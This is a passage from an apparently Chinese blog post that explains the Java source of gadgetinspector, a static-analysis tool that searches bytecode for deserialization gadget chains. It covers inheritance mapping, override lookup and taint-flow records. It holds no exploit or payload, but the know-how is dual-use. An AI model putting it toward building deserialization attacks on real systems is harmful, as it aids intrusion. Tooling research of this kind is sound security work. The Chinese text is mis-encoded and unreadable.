class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * è·å–ç»§æ‰¿ä¿¡æ¯ï¼šå­ç±»-&gt;çˆ¶ç±»é›†åˆã€çˆ¶ç±»-&gt;å­ç±»é›†åˆ</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> classMap ç±»ä¿¡æ¯</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> InheritanceMap <span class="title">derive</span><span class="params">(Map&lt;ClassReference.Handle, ClassReference&gt; classMap)</span> </span>&#123;</span><br><span class="line">        LOGGER.debug(<span class="string">&quot;Calculating inheritance for &quot;</span> + (classMap.size()) + <span class="string">&quot; classes...&quot;</span>);</span><br><span class="line">        Map&lt;ClassReference.Handle, Set&lt;ClassReference.Handle&gt;&gt; implicitInheritance = <span class="keyword">new</span> HashMap&lt;&gt;();</span><br><span class="line">        <span class="comment">// éå†æ‰€æœ‰ç±»</span></span><br><span class="line">        <span class="keyword">for</span> (ClassReference classReference : classMap.values()) &#123;</span><br><span class="line">            <span class="keyword">if</span> (implicitInheritance.containsKey(classReference.getHandle())) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> IllegalStateException(<span class="string">&quot;Already derived implicit classes for &quot;</span> + classReference.getName());</span><br><span class="line">            &#125;</span><br><span class="line">            Set&lt;ClassReference.Handle&gt; allParents = <span class="keyword">new</span> HashSet&lt;&gt;();</span><br><span class="line"></span><br><span class="line">            <span class="comment">// è·å– classReference çš„æ‰€æœ‰çˆ¶ç±»ã€è¶…ç±»ã€æ¥å£ç±»</span></span><br><span class="line">            getAllParents(classReference, classMap, allParents);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// æ·»åŠ ç¼“å­˜ï¼šç±»å-&gt;æ‰€æœ‰çš„çˆ¶ç±»ã€è¶…ç±»ã€æ¥å£ç±»</span></span><br><span class="line">            implicitInheritance.put(classReference.getHandle(), allParents);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> InheritanceMap(implicitInheritance);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * è·å–ç›®æ ‡ç±»çš„æ‰€æœ‰çˆ¶ç±»ã€è¶…ç±»ã€æ¥å£ç±»</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> classReference ç›®æ ‡ç±»</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> classMap       ç±»ä¿¡æ¯</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> allParents     çˆ¶ç±»ã€è¶…ç±»ã€æ¥å£ç±»</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">getAllParents</span><span class="params">(ClassReference classReference, Map&lt;ClassReference.Handle, ClassReference&gt; classMap, Set&lt;ClassReference.Handle&gt; allParents)</span> </span>&#123;</span><br><span class="line">        Set&lt;ClassReference.Handle&gt; parents = <span class="keyword">new</span> HashSet&lt;&gt;();   <span class="comment">// å·²çŸ¥å½“å‰çˆ¶ç±»å’Œæ¥å£</span></span><br><span class="line">        <span class="comment">// æŠŠå½“å‰ classReference ç±»çš„æ‰€æœ‰çˆ¶ç±»æ·»åŠ åˆ° parents</span></span><br><span class="line">        <span class="keyword">if</span> (classReference.getSuperClass() != <span class="keyword">null</span>) &#123;</span><br><span class="line">            parents.add(<span class="keyword">new</span> ClassReference.Handle(classReference.getSuperClass()));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// æŠŠå½“å‰ classReference ç±»å®ç°çš„æ‰€æœ‰æ¥å£æ·»åŠ åˆ° parents</span></span><br><span class="line">        <span class="keyword">for</span> (String iface : classReference.getInterfaces()) &#123;</span><br><span class="line">            parents.add(<span class="keyword">new</span> ClassReference.Handle(iface));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// ä»ç±»æ•°æ®é›†åˆä¸­ï¼Œéå†æ‰¾å‡º classReference çš„ç›´æ¥çˆ¶ç±»/æ¥å£</span></span><br><span class="line">        <span class="keyword">for</span> (ClassReference.Handle immediateParent : parents) &#123; <span class="comment">// æŸ¥æ‰¾ç›´æ¥çˆ¶ç±»ä¿¡æ¯</span></span><br><span class="line">            ClassReference parentClassReference = classMap.get(immediateParent);</span><br><span class="line">            <span class="keyword">if</span> (parentClassReference == <span class="keyword">null</span>) &#123;</span><br><span class="line">                LOGGER.debug(<span class="string">&quot;No class id for &quot;</span> + immediateParent.getName());</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// æ·»åŠ åˆ° allParents çˆ¶ç±»é›†åˆä¸­</span></span><br><span class="line">            allParents.add(parentClassReference.getHandle());</span><br><span class="line">            <span class="comment">// é€’å½’æŸ¥æ‰¾ï¼Œç›´åˆ°æŠŠ classReference ç±»çš„æ‰€æœ‰çˆ¶ç±»ã€è¶…ç±»ã€æ¥å£ç±»éƒ½æ·»åŠ åˆ° allParents</span></span><br><span class="line">            getAllParents(parentClassReference, classMap, allParents);  <span class="comment">// é€’å½’æŸ¥æ‰¾çˆ¶ç±»çš„çˆ¶ç±»</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * è·å–ç±»çš„æ‰€æœ‰é‡å†™æ–¹æ³•</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> inheritanceMap ç»§æ‰¿å…³ç³»</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> methodMap      æ–¹æ³•ä¿¡æ¯</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Map&lt;MethodReference.Handle, Set&lt;MethodReference.Handle&gt;&gt; getAllMethodImplementations(</span><br><span class="line">            InheritanceMap inheritanceMap, Map&lt;MethodReference.Handle, MethodReference&gt; methodMap) &#123;</span><br><span class="line">        <span class="comment">// å­˜å‚¨ç±»çš„æ–¹æ³•ï¼Œç±»-&gt;æ–¹æ³•é›†åˆ</span></span><br><span class="line">        Map&lt;ClassReference.Handle, Set&lt;MethodReference.Handle&gt;&gt; methodsByClass = <span class="keyword">new</span> HashMap&lt;&gt;();</span><br><span class="line">        <span class="comment">// éå†æ–¹æ³•ä¿¡æ¯ï¼Œè·å–ç±»-&gt;æ–¹æ³•é›†åˆ</span></span><br><span class="line">        <span class="keyword">for</span> (MethodReference.Handle method : methodMap.keySet()) &#123;</span><br><span class="line">            ClassReference.Handle classReference = method.getClassReference();  <span class="comment">// è·å–ç±»</span></span><br><span class="line">            <span class="keyword">if</span> (!methodsByClass.containsKey(classReference)) &#123;  <span class="comment">// é¿å…é‡å¤</span></span><br><span class="line">                Set&lt;MethodReference.Handle&gt; methods = <span class="keyword">new</span> HashSet&lt;&gt;();  <span class="comment">// å­˜å‚¨æ–¹æ³•</span></span><br><span class="line">                methods.add(method);</span><br><span class="line">                methodsByClass.put(classReference, methods);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                methodsByClass.get(classReference).add(method); <span class="comment">// æ·»åŠ æ–¹æ³•</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// å­˜å‚¨ç»§æ‰¿å…³ç³»ï¼Œçˆ¶ç±»-&gt;å­ç±»é›†åˆ</span></span><br><span class="line">        Map&lt;ClassReference.Handle, Set&lt;ClassReference.Handle&gt;&gt; subClassMap = <span class="keyword">new</span> HashMap&lt;&gt;();</span><br><span class="line">        <span class="keyword">for</span> (Map.Entry&lt;ClassReference.Handle, Set&lt;ClassReference.Handle&gt;&gt; entry : inheritanceMap.entrySet()) &#123;</span><br><span class="line">            <span class="comment">// ä» å­ç±»-&gt;çˆ¶ç±»é›†åˆ ä¸­å–å‡ºçˆ¶ç±»</span></span><br><span class="line">            <span class="keyword">for</span> (ClassReference.Handle parent : entry.getValue()) &#123;</span><br><span class="line">                <span class="keyword">if</span> (!subClassMap.containsKey(parent)) &#123; <span class="comment">// é¿å…é‡å¤</span></span><br><span class="line">                    Set&lt;ClassReference.Handle&gt; subClasses = <span class="keyword">new</span> HashSet&lt;&gt;();    <span class="comment">// å­˜å‚¨å­ç±»</span></span><br><span class="line">                    subClasses.add(entry.getKey());</span><br><span class="line">                    subClassMap.put(parent, subClasses);</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    subClassMap.get(parent).add(entry.getKey());    <span class="comment">// æ·»åŠ å­ç±»</span></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// æŸ¥æ‰¾é‡å†™æ–¹æ³•</span></span><br><span class="line">        Map&lt;MethodReference.Handle, Set&lt;MethodReference.Handle&gt;&gt; methodImplMap = <span class="keyword">new</span> HashMap&lt;&gt;();</span><br><span class="line">        <span class="comment">// éå†æ–¹æ³•é›†åˆ</span></span><br><span class="line">        <span class="keyword">for</span> (MethodReference method : methodMap.values()) &#123;</span><br><span class="line">            <span class="comment">// Static methods cannot be overriden</span></span><br><span class="line">            <span class="keyword">if</span> (method.isStatic()) &#123;    <span class="comment">// é™æ€æ–¹æ³•ä¸èƒ½è¢«é‡å†™</span></span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// å­˜å‚¨é‡å†™æ–¹æ³•</span></span><br><span class="line">            Set&lt;MethodReference.Handle&gt; overridingMethods = <span class="keyword">new</span> HashSet&lt;&gt;();</span><br><span class="line">            Set&lt;ClassReference.Handle&gt; subClasses = subClassMap.get(method.getClassReference());    <span class="comment">// æ–¹æ³•æ‰€å±ç±»çš„å­ç±»é›†åˆ</span></span><br><span class="line">            <span class="keyword">if</span> (subClasses != <span class="keyword">null</span>) &#123;</span><br><span class="line">                <span class="comment">// éå†å­ç±»</span></span><br><span class="line">                <span class="keyword">for</span> (ClassReference.Handle subClass : subClasses) &#123;</span><br><span class="line">                    <span class="comment">// This class extends ours; see if it has a matching method</span></span><br><span class="line">                    Set&lt;MethodReference.Handle&gt; subClassMethods = methodsByClass.get(subClass); <span class="comment">// ç±»çš„æ–¹æ³•é›†åˆ</span></span><br><span class="line">                    <span class="keyword">if</span> (subClassMethods != <span class="keyword">null</span>) &#123;</span><br><span class="line">                        <span class="keyword">for</span> (MethodReference.Handle subClassMethod : subClassMethods) &#123;</span><br><span class="line">                            <span class="comment">// åˆ¤æ–­æ–¹æ³•åç§°å’Œæè¿°ç¬¦æ˜¯å¦ç›¸ç­‰</span></span><br><span class="line">                            <span class="keyword">if</span> (subClassMethod.getName().equals(method.getName()) &amp;&amp; subClassMethod.getDesc().equals(method.getDesc())) &#123;</span><br><span class="line">                                overridingMethods.add(subClassMethod);</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// å¦‚æœå­˜åœ¨é‡å†™æ–¹æ³•ï¼Œåˆ™ä¿å­˜åˆ° methodImplMap ä¸­</span></span><br><span class="line">            <span class="keyword">if</span> (overridingMethods.size() &gt; <span class="number">0</span>) &#123;</span><br><span class="line">                methodImplMap.put(method.getHandle(), overridingMethods);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> methodImplMap;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="7-GraphCall"><a href="#7-GraphCall" class="headerlink" title="7. GraphCall"></a>7. GraphCall</h3><p>å®šä¹‰æ±¡ç‚¹åœ¨<strong>è°ƒç”¨å…³ç³»</strong>ä¸­çš„ä¼ é€’ä¿¡æ¯ï¼ŒæŒ‡çš„æ˜¯è¢«è°ƒç”¨æ–¹æ³•çš„å‚æ•°å—è°ƒç”¨è€…æ–¹æ³•çš„å‚æ•°å½±å“ï¼Œä½¿ç”¨ asm è®¿é—®è€…è®°å½•ï¼Œæ¶‰åŠæ¨¡æ‹Ÿ JVM çš„ä¸€äº›æ“ä½œï¼Œå…·ä½“å®ç°åœ¨ <code>CallGraphDiscovery</code> ç±»ä¸­ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">GraphCall</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> MethodReference.Handle callerMethod;  <span class="comment">// è°ƒç”¨è€…ï¼ˆæ–¹æ³•ï¼‰</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> MethodReference.Handle targetMethod;  <span class="comment">// è¢«è°ƒç”¨è€…ï¼ˆæ–¹æ³•ï¼‰</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> <span class="keyword">int</span> callerArgIndex;   <span class="comment">// è°ƒç”¨è€…ï¼ˆæ–¹æ³•ï¼‰çš„å‚æ•°ç´¢å¼•</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> String callerArgPath; <span class="comment">// å‚æ•°å¯¹è±¡çš„å“ªä¸ªå­—æ®µè¢«ä¼ é€’</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> <span class="keyword">int</span> targetArgIndex;   <span class="comment">// è¢«è°ƒç”¨è€…ï¼ˆæ–¹æ³•ï¼‰çš„å‚æ•°ç´¢å¼•</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">GraphCall</span><span class="params">(MethodReference.Handle callerMethod, MethodReference.Handle targetMethod, <span class="keyword">int</span> callerArgIndex, String callerArgPath, <span class="keyword">int</span> targetArgIndex)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.callerMethod = callerMethod;</span><br><span class="line">        <span class="keyword">this</span>.targetMethod = targetMethod;</span><br><span class="line">        <span class="keyword">this</span>.callerArgIndex = callerArgIndex;</span><br><span class="line">        <span class="keyword">this</span>.callerArgPath = callerArgPath;</span><br><span class="line">        <span class="keyword">this</span>.targetArgIndex = targetArgIndex;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> MethodReference.<span class="function">Handle <span class="title">getCallerMethod</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> callerMethod;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> MethodReference.<span class="function">Handle <span class="title">getTargetMethod</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> targetMethod;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getCallerArgIndex</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> callerArgIndex;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getCallerArgPath</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> callerArgPath;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getTargetArgIndex</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> targetArgIndex;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">equals</span><span class="params">(Object o)</span> </span>&#123;   <span class="comment">// æ¯”è¾ƒæ–¹æ³•</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">this</span> == o) <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">        <span class="keyword">if</span> (o == <span class="keyword">null</span> || getClass() != o.getClass()) <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line"></span><br><span class="line">        GraphCall graphCall = (GraphCall) o;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (callerArgIndex != graphCall.callerArgIndex) <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        <span class="keyword">if</span> (targetArgIndex != graphCall.targetArgIndex) <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        <span class="keyword">if</span> (callerMethod != <span class="keyword">null</span> ? !callerMethod.equals(graphCall.callerMethod) : graphCall.callerMethod != <span class="keyword">null</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        <span class="keyword">if</span> (targetMethod != <span class="keyword">null</span> ? !targetMethod.equals(graphCall.targetMethod) : graphCall.targetMethod != <span class="keyword">null</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        <span class="keyword">return</span> callerArgPath != <span class="keyword">null</span> ? callerArgPath.equals(graphCall.callerArgPath) : graphCall.callerArgPath == <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">hashCode</span><span class="params">()</span> </span>&#123; <span class="comment">// å­˜å‚¨åˆ°é”®å€¼æ•°æ®æ ¼å¼ä¸­è°ƒç”¨çš„æ¯”è¾ƒæ–¹æ³•</span></span><br><span class="line">        <span class="keyword">int</span> result = callerMethod != <span class="keyword">null</span> ? callerMethod.hashCode() : <span class="number">0</span>;</span><br><span class="line">        result = <span class="number">31</span> * result + (targetMethod != <span class="keyword">null</span> ? targetMethod.hashCode() : <span class="number">0</span>);</span><br><span class="line">        result = <span class="number">31</span> * result + callerArgIndex;</span><br><span class="line">        result = <span class="number">31</span> * result + (callerArgPath != <span class="keyword">null</span> ? callerArgPath.hashCode() : <span class="number">0</span>);</span><br><span class="line">        result = <span class="number">31</span> * result + targetArgIndex;</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å®šä¹‰è¯»å†™æ ¼å¼ï¼š<code>çˆ¶ç±»ï¼Œçˆ¶æ–¹æ³•ï¼Œçˆ¶æ–¹æ³•æè¿°ç¬¦ï¼Œå­ç±»ï¼Œè¢«è°ƒæ–¹æ³•ï¼Œè¢«è°ƒæ–¹æ³•æè¿°ï¼Œçˆ¶æ–¹æ³•å‚æ•°ç´¢å¼•ï¼Œçˆ¶æ–¹æ³•å‚æ•°åï¼Œè¢«è°ƒæ–¹æ³•å‚æ•°ç´¢å¼•</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">Factory</span> <span class="keyword">implements</span> <span class="title">DataFactory</span>&lt;<span class="title">GraphCall</span>&gt; </span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> GraphCall <span class="title">parse</span><span class="params">(String[] fields)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> GraphCall(</span><br><span class="line">                <span class="keyword">new</span> MethodReference.Handle(<span class="keyword">new</span> ClassReference.Handle(fields[<span class="number">0</span>]), fields[<span class="number">1</span>], fields[<span class="number">2</span>]),</span><br><span class="line">                <span class="keyword">new</span> MethodReference.Handle(<span class="keyword">new</span> ClassReference.Handle(fields[<span class="number">3</span>]), fields[<span class="number">4</span>], fields[<span class="number">5</span>]),</span><br><span class="line">                Integer.parseInt(fields[<span class="number">6</span>]),</span><br><span class="line">                fields[<span class="number">7</span>],</span><br><span class="line">                Integer.parseInt(fields[<span class="number">8</span>]));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String[] serialize(GraphCall obj) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> String[]&#123;</span><br><span class="line">                obj.callerMethod.getClassReference().getName(), obj.callerMethod.getName(), obj.callerMethod.getDesc(),</span><br><span class="line">                obj.targetMethod.getClassReference().getName(), obj.targetMethod.getName(), obj.targetMethod.getDesc(),</span><br><span class="line">                Integer.toString(obj.callerArgIndex),</span><br><span class="line">                obj.callerArgPath,</span><br><span class="line">                Integer.toString(obj.targetArgIndex),</span><br><span class="line">        &#125;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="8-Source"><a href="#8-Source" class="headerlink" title="8. Source"></a>8. Source</h3><p>å®šä¹‰<strong>æ±¡ç‚¹æºä¿¡æ¯</strong>çš„æè¿°æ–¹å¼ï¼Œç”±å®ç°äº†æŠ½è±¡ç±» <code>SourceDiscovery</code> çš„ç±»æœç´¢å’Œè®°å½•ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Source</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> MethodReference.Handle sourceMethod;  <span class="comment">// æ‰€å±æ–¹æ³•</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> <span class="keyword">int</span> taintedArgIndex;                  <span class="comment">// ä¼ é€’æ±¡ç‚¹çš„å‚æ•°ç´¢å¼•</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Source</span><span class="params">(MethodReference.Handle sourceMethod, <span class="keyword">int</span> taintedArgIndex)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.sourceMethod = sourceMethod;</span><br><span class="line">        <span class="keyword">this</span>.taintedArgIndex = taintedArgIndex;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> MethodReference.<span class="function">Handle <span class="title">getSourceMethod</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> sourceMethod;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getTaintedArgIndex</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> taintedArgIndex;</span><br><span class="line">    &#125;</span><br><span class="line">...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å®šä¹‰<strong>æ±¡ç‚¹æºä¿¡æ¯</strong>çš„è¯»å†™æ ¼å¼ï¼š<code>ç±»å æ–¹æ³•å æ–¹æ³•æè¿°ç¬¦ å‚æ•°ç´¢å¼•</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">Factory</span> <span class="keyword">implements</span> <span class="title">DataFactory</span>&lt;<span class="title">Source</span>&gt; </span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Source <span class="title">parse</span><span class="params">(String[] fields)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> Source(</span><br><span class="line">                <span class="keyword">new</span> MethodReference.Handle(<span class="keyword">new</span> ClassReference.Handle(fields[<span class="number">0</span>]), fields[<span class="number">1</span>], fields[<span class="number">2</span>]),</span><br><span class="line">                Integer.parseInt(fields[<span class="number">3</span>])</span><br><span class="line">        );</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String[] serialize(Source obj) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> String[]&#123;</span><br><span class="line">                obj.sourceMethod.getClassReference().getName(), obj.sourceMethod.getName(), obj.sourceMethod.getDesc(),</span><br><span class="line">                Integer.toString(obj.taintedArgIndex),</span><br><span class="line">        &#125;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="gadgetinspector"><a href="#gadgetinspector" class="headerlink" title="gadgetinspector"></a>gadgetinspector</h2><p>å®ç°æ£€æµ‹éœ€è¦å®ç°çš„æŠ½è±¡ç±»å’Œæ¥å£ï¼Œå…¶ä»–ç±»çš„è§£ææ”¾åˆ° <strong>0x03 å·¥ä½œæµç¨‹</strong> ä¸€èŠ‚ã€‚</p><h3 id="1-SerializableDecider"><a href="#1-SerializableDecider" class="headerlink" title="1. SerializableDecider"></a>1. SerializableDecider</h3><p>åºåˆ—åŒ–å†³ç­–è€…æ¥å£ï¼Œåˆ¤æ–­ç±»æ˜¯å¦å¯åºåˆ—åŒ–ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Represents logic to decide if a class is serializable. The simple case (implemented by</span></span><br><span class="line"><span class="comment"> * &#123;<span class="doctag">@link</span> SimpleSerializableDecider&#125;) just checks if the class implements serializable. Other use-cases may have more</span></span><br><span class="line"><span class="comment"> * complicated logic.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">SerializableDecider</span> <span class="keyword">extends</span> <span class="title">Function</span>&lt;<span class="title">ClassReference</span>.<span class="title">Handle</span>, <span class="title">Boolean</span>&gt; </span>&#123; <span class="comment">// åºåˆ—åŒ–å†³ç­–è€…</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="2-ImplementationFinder"><a href="#2-ImplementationFinder" class="headerlink" title="2. ImplementationFinder"></a>2. ImplementationFinder</h3><p>æ¥å£ï¼Œç”¨äºæŸ¥æ‰¾å¯åºåˆ—åŒ–çš„é‡å†™æ–¹æ³•ï¼Œå³åˆ¤æ–­æ–¹æ³•æ‰€å±ç±»æ˜¯å¦å¯åºåˆ—åŒ–ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">ImplementationFinder</span> </span>&#123;</span><br><span class="line">    